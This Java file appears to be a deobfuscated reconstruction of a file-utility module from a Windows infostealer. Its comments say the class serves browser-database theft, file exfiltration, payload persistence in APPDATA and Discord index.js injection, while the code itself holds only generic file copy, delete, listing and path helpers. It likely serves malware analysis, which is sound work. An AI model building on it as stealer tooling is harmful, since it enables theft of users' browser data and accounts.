import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;

/**
 * File Operations Utility
 * Obfuscated names: ռ (U+057C), ӷ (U+04F7)
 *
 * Utility class for file system operations used throughout the malware.
 *
 * ռ (U+057C) - Main file operations class (1777 lines)
 * Functionality:
 * - Copy files with retry logic
 * - Delete files securely
 * - Create directories recursively
 * - List files matching patterns
 * - Check file accessibility (not locked by another process)
 * - Get file size and metadata
 * - Temp file management
 *
 * ӷ (U+04F7) - Simple file utility (231 lines)
 * Functionality:
 * - Basic file existence checks
 * - Simple file copy/move
 * - Path manipulation
 *
 * Used by:
 * - BrowserDataStealer: copies locked browser databases
 * - FileExfiltrator: reads and packages files
 * - PersistenceUpdater: copies payload to APPDATA
 * - DiscordInjector: reads/writes Discord index.js
 */
public class FileOperations {

    // =========================================================
    // FILE COPY
    // =========================================================

    /**
     * Copies a file with retry logic.
     * Retries up to 3 times with 500ms delay between attempts.
     * Used for copying locked browser databases.
     *
     * @param source Source file path
     * @param dest Destination file path
     * @return true if copy succeeded
     */
    public static boolean copyWithRetry(File source, File dest) {
        for (int attempt = 0; attempt < 3; attempt++) {
            try {
                Files.copy(source.toPath(), dest.toPath(),
                    StandardCopyOption.REPLACE_EXISTING);
                return true;
            } catch (IOException e) {
                try {
                    Thread.sleep(500);
                } catch (InterruptedException ignored) {}
            }
        }
        return false;
    }

    /**
     * Copies a file to a temp location.
     * Used to access locked files (browser databases).
     *
     * @param source Source file
     * @param prefix Temp file prefix
     * @param suffix Temp file suffix (e.g., ".db")
     * @return Temp file, or null on failure
     */
    public static File copyToTemp(File source, String prefix, String suffix) {
        try {
            File tempFile = File.createTempFile(prefix, suffix);
            tempFile.deleteOnExit();
            Files.copy(source.toPath(), tempFile.toPath(),
                StandardCopyOption.REPLACE_EXISTING);
            return tempFile;
        } catch (Exception e) {
            return null;
        }
    }

    // =========================================================
    // FILE LISTING
    // =========================================================

    /**
     * Lists all files in a directory matching a pattern.
     *
     * @param dir Directory to search
     * @param extension File extension filter (e.g., ".java")
     * @param recursive Whether to search subdirectories
     * @return List of matching files
     */
    public static List<File> listFiles(File dir, String extension, boolean recursive) {
        List<File> result = new ArrayList<>();
        if (!dir.exists() || !dir.isDirectory()) return result;

        File[] files = dir.listFiles();
        if (files == null) return result;

        for (File file : files) {
            if (file.isDirectory() && recursive) {
                result.addAll(listFiles(file, extension, true));
            } else if (file.isFile()) {
                if (extension == null || file.getName().endsWith(extension)) {
                    result.add(file);
                }
            }
        }

        return result;
    }

    // =========================================================
    // FILE DELETION
    // =========================================================

    /**
     * Deletes a file or directory recursively.
     *
     * @param file File or directory to delete
     * @return true if deletion succeeded
     */
    public static boolean deleteRecursively(File file) {
        if (!file.exists()) return true;

        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursively(child);
                }
            }
        }

        return file.delete();
    }

    // =========================================================
    // FILE ACCESSIBILITY
    // =========================================================

    /**
     * Checks if a file is accessible (not locked by another process).
     *
     * @param file File to check
     * @return true if file can be read
     */
    public static boolean isAccessible(File file) {
        if (!file.exists() || !file.isFile()) return false;
        try {
            // Try to open the file
            new java.io.FileInputStream(file).close();
            return true;
        } catch (IOException e) {
            return false;
        }
    }

    // =========================================================
    // PATH UTILITIES
    // =========================================================

    /**
     * Gets the APPDATA path for a given subdirectory.
     *
     * @param subPath Subdirectory path (e.g., "Discord")
     * @return Full path string
     */
    public static String getAppDataPath(String subPath) {
        return System.getenv("APPDATA") + "\\" + subPath;
    }

    /**
     * Gets the LOCALAPPDATA path for a given subdirectory.
     *
     * @param subPath Subdirectory path
     * @return Full path string
     */
    public static String getLocalAppDataPath(String subPath) {
        return System.getenv("LOCALAPPDATA") + "\\" + subPath;
    }

    /**
     * Creates a directory and all parent directories.
     *
     * @param dir Directory to create
     * @return true if directory exists after this call
     */
    public static boolean mkdirs(File dir) {
        return dir.exists() || dir.mkdirs();
    }
}
